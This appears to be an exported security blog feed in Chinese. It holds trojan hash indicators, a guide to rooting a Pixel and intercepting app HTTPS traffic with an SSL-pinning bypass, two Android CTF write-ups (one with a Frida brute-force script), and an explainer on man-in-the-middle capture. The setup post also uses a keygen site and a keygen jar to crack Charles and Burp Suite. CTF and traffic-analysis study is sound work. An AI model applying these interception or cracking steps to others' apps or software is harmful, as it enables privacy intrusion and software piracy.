<td>Zayimahizo.dll</td>
<td>5a8f117565e4add93e564ad9ac086c85</td>
</tr>
<tr>
<td>Ziniyucenaqe.dll</td>
<td>439b2205e6e881e64dde45b0c71f4dfe</td>
</tr>
<tr>
<td>msqvfea.bat</td>
<td>92804812b5fd9459f7cf3c2d607804c1</td>
</tr>
<tr>
<td>msiexec.exe</td>
<td>92804812b5fd9459f7cf3c2d607804c1</td>
</tr>
<tr>
<td>msyalicw.com</td>
<td>92804812b5fd9459f7cf3c2d607804c1</td>
</tr>
<tr>
<td>msozpgci.exe</td>
<td>eb069d27bae4c00dc581f670f2423bb8</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>Andromeda木马</tag>
        <tag>windows木马</tag>
      </tags>
  </entry>
  <entry>
    <title>Android刷机+抓包环境配置</title>
    <url>/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>设备：Pixel XL</p>
<p>镜像：Android10</p>
<p>抓包环境：Lsposed + fiddler</p>
<h2 id="刷入镜像"><a href="#刷入镜像" class="headerlink" title="刷入镜像"></a>刷入镜像</h2><h3 id="下载镜像并解压"><a href="#下载镜像并解压" class="headerlink" title="下载镜像并解压"></a><a href="https://dl.google.com/dl/android/aosp/marlin-ota-qp1a.191005.007.a1-eea9b8dd.zip?hl=zh-cn">下载镜像</a>并解压</h3><img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/a4cd7f6de8dc443c9980acee79e9741b.png" class="" title="fe13d07737febe2d3f7b857ff4dab08b.png">
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/a76805cdef144f7095e4825e5b658e49.png" class="" title="6caf5a7a9378ffbbb3df3fd747f8fc3e.png">

<h3 id="将手机进入bootloader模式"><a href="#将手机进入bootloader模式" class="headerlink" title="将手机进入bootloader模式"></a>将手机进入bootloader模式</h3><ul>
<li>开机状态可以使用命令<code>adb reboot bootloader</code>直接进入</li>
<li>关机可以直接按住<code>电源键+音量下键</code>进入</li>
</ul>
<h3 id="执行flash-all-s刷机"><a href="#执行flash-all-s刷机" class="headerlink" title="执行flash-all.s刷机"></a>执行flash-all.s刷机</h3><img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ecad2747929040459f2e8493a9119071.png" class="" title="a2d0bea367a10635583957077b588129.png">

<p>刷机完成</p>
<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><h3 id="先在开发者模式打开USB调试开关"><a href="#先在开发者模式打开USB调试开关" class="headerlink" title="先在开发者模式打开USB调试开关"></a>先在开发者模式打开USB调试开关</h3><img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/12604ffaeb2347ceab722cd88a3c3933.png" class="" title="966c0f010eb47dc870b0511763627f3d.png">

<h3 id="安装Magisk"><a href="#安装Magisk" class="headerlink" title="安装Magisk"></a>安装Magisk</h3><p><a href="https://github.com/topjohnwu/Magisk/releases/download/v26.1/Magisk-v26.1.apk">下载Magisk</a>现在最新版的是26.1</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/1e400ef78079400c8430e7464c21df43.png" class="" title="57d20caf186b109994d1e0b9af51974a.png">

<p><code>adb install .\Magisk-v26.1.apk</code></p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/f848fc1d2e9c4533b4eb1e0c436c9551.png" class="" title="d0455a866ebc44752d136c1109a45531.png">

<h3 id="刷入boot-img"><a href="#刷入boot-img" class="headerlink" title="刷入boot.img"></a>刷入boot.img</h3><p>解压镜像里面的<code>.zip</code>包，获取boot.img</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/e69c6ffabb2d40b2b5aee4acb69e20ac.png" class="" title="f3ddcef9c5ce432de097ee2572996d55.png">

<p>确认手机开启了A/B系统更新</p>
<pre><code class="css"> adb shell getprop ro.build.ab_update
 adb shell getprop ro.build.system_root_image
</code></pre>
<p>将<code>boot.img</code>push到sd卡</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/de47521ef65e4c36808242065efaea8f.png" class="" title="d907bb012984352712e71eb678da1cd5.png">

<p>打开Margisk选择安装 → 选择并修补一个文件 → 选择刚刚push的<code>boot.img</code> → 开始</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/6f5ef72746244259a2efaec320865d4f.png" class="" title="1af9ea2a0939053851b8ab5ca758f211.png">

<p>点击保存，并将生成的文件拉取下来</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/a5c0bbef2a994a418645a09edac4bac3.png" class="" title="8836e82cc8c8068ef8e02f29817f9447.png">

<p>然后将其刷入boot分区中</p>
<ul>
<li><ol>
<li><p>进入fastboot模式：使用<code>adb reboot bootloader</code>或者<code>adb reboot fastboot</code>（根据pixel型号选择，有些比较老的型号直接进入bootloader就行了）如果命令进入失败手动关机后按住<strong>开机键+音量减</strong>进入</p>
</li>
<li><p>输入命令刷入<code> fastboot flash boot .\magisk_patched-26100_TDHKz.img</code></p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/54a900ad116444c59fccec41454b8a1b.png" class="" title="ec4eabed226dcda5335aec66312f6870.png"></li>
</ol>
</li>
</ul>
<p>重启手机 → 打开Magisk → 安装 → 直接安装 →  重启</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ba1e2632fdc84716afaac61da9c8201f.png" class="" title="c49df6951d4a8e297e6704f6a1530fd8.png">

<p>此时就root成功可以获取root权限了。</p>
<h2 id="配置抓包环境"><a href="#配置抓包环境" class="headerlink" title="配置抓包环境"></a>配置抓包环境</h2><h3 id="安装Lsposed"><a href="#安装Lsposed" class="headerlink" title="安装Lsposed"></a>安装Lsposed</h3><p><a href="https://github.com/LSPosed/LSPosed/releases">下载新版zip包</a>(riru对老版本版本的兼容性更好，riru版本需要先安装riru框架才能安装上。zygisk版本性能更好。如果不需要兼容特别老的版本一般来说安装zygisk版本即可)</p>
<blockquote>
<p>安装riru版本：需要先安装riru然后重启，再安装ritu版本的Lsposed</p>
<p>安装zygisk版本：打开Magisk设置的zygisk开关并重启生效，然后安装zygisk版本的Lsposed</p>
</blockquote>
<p>将下载好的zip包push到手机</p>
<p>打开Magisk模块，从本地安装</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/8d5754c6b5834055ab39886d623af152.png" class="" title="c459462f02e78f1be281fdac3d301ca5.png">

<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>移动证书到根目录：</p>
<blockquote>
<ol>
<li>把<a href="https://github.com/NVISOsecurity/MagiskTrustUserCerts/releases">AlwaysTrustUserCerts</a>压缩包复制到设备目录下，在Magisk中安装这个模块，安装完成后按提示重启。用于将用户证书拷贝到系统证书</li>
<li>或者使用Magisk的模块<a href="https://github.com/ys1231/MoveCertificate">MoveCertificate</a>也行</li>
<li>或者不安装自己手动拷贝也行。</li>
</ol>
</blockquote>
<p>通过SSL：不过这个不一定对所有软件都适用，原因在后面使用FridaHook抓包的时候再详述</p>
<blockquote>
<p> <a href="https://github.com/ViRb3/TrustMeAlready/releases">TrustMeAlread</a>下载apk安装。具体作用于哪个app在LSPosed中设置就可以</p>
</blockquote>
<h3 id="fiddler抓包"><a href="#fiddler抓包" class="headerlink" title="fiddler抓包"></a>fiddler抓包</h3><h4 id="安装fiddler证书"><a href="#安装fiddler证书" class="headerlink" title="安装fiddler证书"></a>安装fiddler证书</h4><ul>
<li><p>在fiddler选项里面配置监听端口</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/e38d4f7f3f50499ea0c748e8d3be11a0.png" class="" title="f47cd1e5b3e81eab1ec94d9f0b2cd026.png">
</li>
<li><p>在手机浏览器下载并安装证书</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/7d1f65fbdd3c486a9887089ce92c4393.png" class="" title="fa655bc1892042ff4211b62ba0182062.png">
</li>
<li><p><strong>（如果没有安装成功，打开设置在WLAN偏好设置中安装证书）</strong></p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20231004111707549.png" class="" title="image-20231004111707549">
</li>
<li><p>配置wifi代理，需要和运行fiddler的电脑在同一个局域网</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/e030a98bf6ca43dcb5c961cdba97729e.png" class="" title="7bd5cb5d3fa4e5ec026a3a41bfcfefc2.png">
</li>
<li><p>打开LSPosed启用TrustMeAlready</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/a4b569d9c68c40a3b60698935c7a0eab.png" class="" title="9a5f7a5225ee5c9088799bcf2da7fcd2.png">
</li>
<li><p>即可抓取https数据包</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/917422b659024a99bfeb5dac99f7de65.png" class="" title="7af87ae5897b0a9a73a091fafb83509c.png"></li>
</ul>
<h3 id="Charles抓包"><a href="#Charles抓包" class="headerlink" title="Charles抓包"></a>Charles抓包</h3><p>charles 是一款非常优秀的抓包工具，全平台支持，在 mac，windows，linux 上都可以使用，既可以抓取 web 端的包，也可以抓 app 端的包<br>charles 主要的功能包括如下几点：</p>
<p>截取 Http 和 Https 网络封包。</p>
<p>支持重发网络请求，方便后端调试。</p>
<p>支持修改网络请求参数。</p>
<p>支持网络请求的截获并动态修改。</p>
<p>支持模拟慢速网络。</p>
<h5 id="代理服务器的工作原理如下所示："><a href="#代理服务器的工作原理如下所示：" class="headerlink" title="代理服务器的工作原理如下所示："></a>代理服务器的工作原理如下所示：</h5><img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/43.webp" class="" title="APP各种抓包教程 Hook | SSL Pinning |Frida">

<p>客户端发起请求，请求通过 charles 转发给服务器，服务器返回响应，响应通过 charles 转发给客户端。</p>
<p>charles 所起的作用就相当于信使，把信息从 A 传递给 B，并且把回信从 B 传递给 A，正因为他这个信使的工作，所以他对信息的内容了如指掌(不管是原信还是回信)，正因为如此，charles 也就可以篡改信息的内容，即篡改请求和响应。</p>
<p>安装charles后去<a href="https://www.zzzmode.com/mytools/charles/">注册码生成</a>网站生成一个账号密码</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240421090726368.png" class="" title="image-20240421090726368">

<h5 id="配置charles"><a href="#配置charles" class="headerlink" title="配置charles"></a>配置charles</h5><p>安装好了之后，连接手机安装Charles的证书</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240130104814015.png" class="" title="image-20240130104814015">

<p>根据提示在手机浏览器中输入这个地址下载证书</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240130104941332.png" class="" title="image-20240130104941332">

<p>有时候网络会有些问题，可以多尝试几次。或者直接下来下来拷贝到手机上安装</p>
<p>下载后直接在浏览器中点击安装就可以，或者在Wi-Fi设置中安装都可以</p>
<ul>
<li>Android10是在WLAN偏好设置处安装，不同版本的系统位置可能略有变化</li>
</ul>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240130105156510.png" class="" title="image-20240130105156510">

<ul>
<li><p>Android11是在<strong>安全 -&gt; 加密与凭据 -&gt; 安装证书</strong></p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240824001058526.png" class="" title="image-20240824001058526"></li>
</ul>
<p>这里已经安装过了，不再重复安装。下载好点进去找到下载的证书直接安装就行，比较简单不再详述</p>
<p>安装后AlwaysTrustUserCerts模块会将我们已经安装的用户证书拷贝到根目录</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240203173559472.png" class="" title="image-20240203173559472">

<h5 id="HTTPS解析"><a href="#HTTPS解析" class="headerlink" title="HTTPS解析"></a>HTTPS解析</h5><p>然后在Proxy $\rightarrow$ SSL Proxying Settings进行SSL Proxying Settings设置勾选enable SSL Proxying复选框代表开启SSL Proxying代理，并在include栏中添加域名和端口号。include重的列表项代表Charles能够展示这些域名的SSL请求和响应的明文</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240421095907897.png" class="" title="image-20240421095907897">

<p>Stop SSL Proxying 按钮可以控制 SSL 代理的开关。（必须要开启SSL Proxying）</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240421100108352.png" class="" title="image-20240421100108352">

<h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>安装并配置好之后，再将手机Wi-Fi的代理为chales运行的本地IP，端口设置为chales抓包的端口，就可以抓到我们在手机上的数据包了</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240130105551351.png" class="" title="image-20240130105551351">

<ul>
<li>需要连接外网的话charles可以设置代理翻墙</li>
</ul>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240131220513849.png" class="" title="image-20240131220513849">

<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240131220539447.png" class="" title="image-20240131220539447">



<ul>
<li>这其中的另外两个复选框可以将流量进行代理转发，暂时不展开，之后的文章中再介绍</li>
</ul>
<h3 id="burp抓包"><a href="#burp抓包" class="headerlink" title="burp抓包"></a>burp抓包</h3><h5 id="PC端安装"><a href="#PC端安装" class="headerlink" title="PC端安装"></a>PC端安装</h5><p>安装可以参考这篇<a href="https://www.ddosi.org/burpsuite-pro-bcheck/#burpsuite_pro_20236%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A">帖子</a></p>
<p>将注册机放到跟软件同一个目录下，先运行注册机</p>
<p>运行jar的命令，进行注册</p>
<p><code>java -jar BurpLoaderKeygen.jar</code></p>
<p>然后就是手动注册流程，复制过来复制过去就好了</p>
<h5 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h5><ul>
<li><p>添加一个代理监听</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420102901757.png" class="" title="image-20240420102901757">
</li>
<li><p>给手机Wi-Fi连接上burp的代理监听</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420103212662.png" class="" title="image-20240420103212662">
</li>
<li><p>在手机浏览器上访问<a href="http://burp/">http://burp</a>下载证书</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420103351225.png" class="" title="image-20240420103351225">

<p>找到下载的证书，修改后缀名为<code>.cer</code></p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420103643932.png" class="" title="image-20240420103643932">

<p>在设置里面找到安装证书 -&gt; 安装刚才改过名字的burp证书</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420104407828.png" class="" title="image-20240420104407828">

<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420104501134.png" class="" title="image-20240420104501134">



<h5 id="抓包-1"><a href="#抓包-1" class="headerlink" title="抓包"></a>抓包</h5><p>安装完成之后，接下来例如打开浏览器在百度中搜索</p>
<img src="/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20240420134728981.png" class="" title="image-20240420134728981">

<ul>
<li>可以看到就抓去到了搜索的数据包，也有我们搜索的<strong>aaasss</strong>，如果抓不到可以检查一下是不是凭证没成功的拷贝的根目录或者重启服务端和设备试试</li>
</ul>
</li>
</ul>
<p><strong>参考文章</strong></p>
<p><a href="https://www.ddosi.org/app-packet-captures/">APP各种抓包教程 Hook | SSL Pinning |Frida - 🔰雨苁ℒ🔰 (ddosi.org)</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android刷机</tag>
        <tag>抓包环境</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF001</title>
    <url>/2023/07/09/CTF001/</url>
    <content><![CDATA[<img src="/2023/07/09/CTF001/image-20230709145814540.png" class="" title="image-20230709145814540">

<h3 id="用jadx分析代码逻辑"><a href="#用jadx分析代码逻辑" class="headerlink" title="用jadx分析代码逻辑"></a>用jadx分析代码逻辑</h3><p>先查一下程序没有加壳，用jadx打开apk查看代码</p>
<img src="/2023/07/09/CTF001/image-20230709145835648.png" class="" title="image-20230709145835648">

<p>通过_<strong>AndroidManifest.xml</strong><em>找到程序的入口点可以看到提示的字符串<br>然后因为它处理flag的函数是在native层所以我们需要用ida去查看这个函数是怎么在<strong>so文件</strong>中实现的<br>用解压缩软件取出apk的lib库中的so文件，用ida去分析一下<br>ida分析完后在文件中我们可以直接搜索</em><strong>java开头的函数</strong>_或者直接搜索<strong>verify</strong>这个函数，有可能可以直接搜索到<br>如果我们搜索不到verify这个函数的时候也许这个函数是动态注册的，可以通过<strong>JNI_OnLoad</strong>去查找加载的函数<br>JNI_OnLoad()函数是Java Native Interface（JNI）中的一个特殊函数，它在加载本地库时由Java虚拟机调用，它主要用于初始化本地库，并返回JNI的版本号给虚拟机。</p>
<img src="/2023/07/09/CTF001/image-20230709145854617.png" class="" title="image-20230709145854617">

<p>但是这里ida分析的参数有点错误</p>
<h4 id="修复IDA参数识别错误"><a href="#修复IDA参数识别错误" class="headerlink" title="修复IDA参数识别错误"></a>修复IDA参数识别错误</h4><p>看一下JNI_OnLoad()的代码示例</p>
<img src="/2023/07/09/CTF001/image-20230709145909806.png" class="" title="image-20230709145909806">

<p>我们需要去找这个<strong>RegisterNatives()<strong>方法中的第三个参数</strong>methods</strong>来找到注册的本地方法，但是上面IDA识别的有问题需要手动修改一下参数的类型</p>
<img src="/2023/07/09/CTF001/image-20230709145922233.png" class="" title="image-20230709145922233">

<img src="/2023/07/09/CTF001/image-20230709145928563.png" class="" title="image-20230709145928563">

<img src="/2023/07/09/CTF001/image-20230709145933873.png" class="" title="image-20230709145933873">

<p>修复完成</p>
<img src="/2023/07/09/CTF001/image-20230709145946280.png" class="" title="image-20230709145946280">

<h4 id="定位动态注册函数地址"><a href="#定位动态注册函数地址" class="headerlink" title="定位动态注册函数地址"></a>定位动态注册函数地址</h4><p>进来之后就可以定位到动态注册的函数位置</p>
<img src="/2023/07/09/CTF001/image-20230709150003399.png" class="" title="image-20230709150003399">

<p>进来之后发现这是一个简单的算法验证器，对数组的每一位进行了校验</p>
<img src="/2023/07/09/CTF001/image-20230709150015769.png" class="" title="image-20230709150015769">

<h3 id="验证Flag"><a href="#验证Flag" class="headerlink" title="验证Flag"></a>验证Flag</h3><p>先验证一下长度，然后对每一位进行验证全部相等就返回true，我们可以将这些验证的数字转译对应的ascii码，或者直接按<em>table键</em>进入反汇编页面就能看到IDA自动解析的字符编码</p>
<img src="/2023/07/09/CTF001/image-20230709150057728.png" class="" title="image-20230709150057728">

<img src="/2023/07/09/CTF001/image-20230709150104981.png" class="" title="image-20230709150104981">

<p>将字符串输入验证</p>
<img src="/2023/07/09/CTF001/image-20230709150119452.png" class="" title="image-20230709150119452">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF002</title>
    <url>/2023/07/09/CTF002/</url>
    <content><![CDATA[<h3 id="1-通过hook脚本暴力破解"><a href="#1-通过hook脚本暴力破解" class="headerlink" title="1. 通过hook脚本暴力破解"></a>1. 通过hook脚本暴力破解</h3><h4 id="进入入口点之后，简单查看一下代码的逻辑"><a href="#进入入口点之后，简单查看一下代码的逻辑" class="headerlink" title="进入入口点之后，简单查看一下代码的逻辑"></a>进入入口点之后，简单查看一下代码的逻辑</h4><img src="/2023/07/09/CTF002/image-20230709145110009.png" class="" title="image-20230709145110009">

<p>可以发现密码是一个六位数字，经过encode函数加密后跟预定的值进行比较，比较相等就通过。<br>查看这个encode函数使用了sha1摘要算法，这样我们并不能根据hook某一个点位直接获取到正确的密钥，<br>因为密码是六位数字存在暴力破解的可能，我们可以直接hook这个<strong>encode</strong>函数来做一个暴力破解。<br>因为这个_<strong>public class MainActivity extends Activity</strong><em>类不是一个静态类，所以不能直接通过类去调用里面的函数，所以不能直接用</em><strong>Java.use()</strong>_的方式写脚本,需要使用**<em>choose()</em><strong>方法去内存中查找到类</strong>MainActivity**的实例之后再使用类方法</p>
<pre><code class="js">// 使用 setImmediate 在下一个事件循环中执行代码,防止脚本执行过程中报错Failed to load script: timeout was reached
setImmediate(function(){
  // 在 Java 环境中执行代码
  Java.perform(function(){
    // 寻找指定类的实例
    Java.choose("com.android.ctf.MainActivity",{
      // 当匹配到实例时的回调函数
      "onMatch":function(instance){
        console.log("找到实例");
        var str = Java.use("java.lang.String");
        var Integer = Java.use("java.lang.Integer")
        var start = 100000; // 起始值
        var end = 1000000; // 结束值
        for (var i = start; i &lt; end; i++) {
          // 将整数转换为字符串
          var result = instance.encode(Integer.toString(i));
          if (result === "6574f28f75dddc488f3c7c21fddfa0cd16901206") {
            console.log("找到密码: " + i);
            return; // 找到密码后立即返回
          }
        }
      },
      // 堆搜索完成时的回调函数
      "onComplete":function(){
        console.log("堆搜索完成");
      }
    });
  });
});
</code></pre>
<p>执行脚本：这个脚本执行起来比较耗费时间，如果手机性能不够可能程序可能会崩溃，需要缩小搜索范围</p>
<img src="/2023/07/09/CTF002/image-20230709145154071.png" class="" title="image-20230709145154071">

<h3 id="2-正向破解"><a href="#2-正向破解" class="headerlink" title="2. 正向破解"></a>2. 正向破解</h3><p>因为这里有完整的算法，所以可以直接把算法扣出来写代码计算一下结果：</p>
<img src="/2023/07/09/CTF002/image-20230709145403892.png" class="" title="image-20230709145403892">

<p>直接扣出来用Eclipse写java代码正向破解效率会更高，也不用担心程序崩溃的问题</p>
<pre><code class="java">package TestFlag002;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class TestFlag002 {

    public static void main(String[] args) {
        // TODO Auto-generated method stub
        for (int i = 100000; i &lt; 1000000; i++) {
            if ("6574f28f75dddc488f3c7c21fddfa0cd16901206".equals(encode(Integer.toString(i)))) {
                System.out.println(i);
            }
        }
    }

    public static String encode(String decript) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-1");
            digest.update(decript.getBytes());
            byte[] messageDigest = digest.digest();
            StringBuilder hexString = new StringBuilder();
            for (byte b : messageDigest) {
                String shaHex = Integer.toHexString(b &amp; 255);
                if (shaHex.length() &lt; 2) {
                    hexString.append(0);
                }
                hexString.append(shaHex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "";
        }
    }
}
</code></pre>
<img src="/2023/07/09/CTF002/image-20230709145448067.png" class="" title="image-20230709145448067">

<p><strong>运行一秒钟就可以出结果，效率更高。</strong></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android CTF</tag>
        <tag>暴力解密</tag>
      </tags>
  </entry>
  <entry>
    <title>App抓包工具教程汇总</title>
    <url>/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="HTTPS抓包详解"><a href="#HTTPS抓包详解" class="headerlink" title="HTTPS抓包详解"></a>HTTPS抓包详解</h2><ul>
<li>HTTP + SSL + 认证 + 完整性保护 = HTTPS</li>
<li>预共享证书的非对称加解密技术</li>
<li>HTTPS通信完整流程</li>
<li>中间人抓包核心原理</li>
<li>Charles、Burp Suite开启SSL抓包</li>
</ul>
<p>把Charles和burp的证书安装在手机里面是为了通过HTTPS的证书校验</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420205934810.png" class="" title="image-20240420205934810">

<p>认证机关的公开密钥必须安全的转交给客户端。使用通信方式时，如何安全转交是一件很困难的事情。因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥</p>
<h3 id="中间人抓包流程"><a href="#中间人抓包流程" class="headerlink" title="中间人抓包流程"></a>中间人抓包流程</h3><img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420210227284.png" class="" title="image-20240420210227284">

<ul>
<li>在这种情况下，app本质上是和Charles通信，服务器本质上也是跟Charles通信</li>
<li>所以在这个时候需要把Charles的证书放在手机里面</li>
<li>在把证书放到手机信任凭据的根目录之后，App和抓包工具之间以及抓包工具与服务器之间的校验就没有问题了</li>
</ul>
<h2 id="HTTPS到底是什么"><a href="#HTTPS到底是什么" class="headerlink" title="HTTPS到底是什么"></a>HTTPS到底是什么</h2><p>HTTP作为一种被广泛使用的传输协议，也存在一些缺点：</p>
<ol>
<li>无状态（可以通过Cookie或Session解决）</li>
<li>明文传输</li>
<li>不安全</li>
</ol>
<p>为了解决“明文”和“不安全“两个问题，就产生了HTTPS。HTTPS不是一种单独的协议，它是由HTTP + SSL/TLS组成</p>
<h3 id="一图讲解单向认证和双向认证"><a href="#一图讲解单向认证和双向认证" class="headerlink" title="一图讲解单向认证和双向认证"></a>一图讲解单向认证和双向认证</h3><img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/attach-785a37ddf4e976170336b107822babe49522c1b2.png" class="" title="1364.png">

<h3 id="抓包工具抓HTTP包的原理"><a href="#抓包工具抓HTTP包的原理" class="headerlink" title="抓包工具抓HTTP包的原理"></a>抓包工具抓HTTP包的原理</h3><ol>
<li>首先抓包工具会提供出代理服务，客户端需要连接该代理</li>
<li>客户端发出HTTP请求时，会经过抓包工具，抓包工具将请求的原文进行展示</li>
<li>抓包工具使用该原文将请求发送给服务器</li>
<li>服务器返回结果给抓包工具，抓包工具将返回结果进行展示</li>
<li>抓包工具将服务器返回的结果原样返回给客户端</li>
</ol>
<p>抓包工具就相当于一个透明的中间人，数据经过的时候它一手接收数据，另一手奖数据传出去</p>
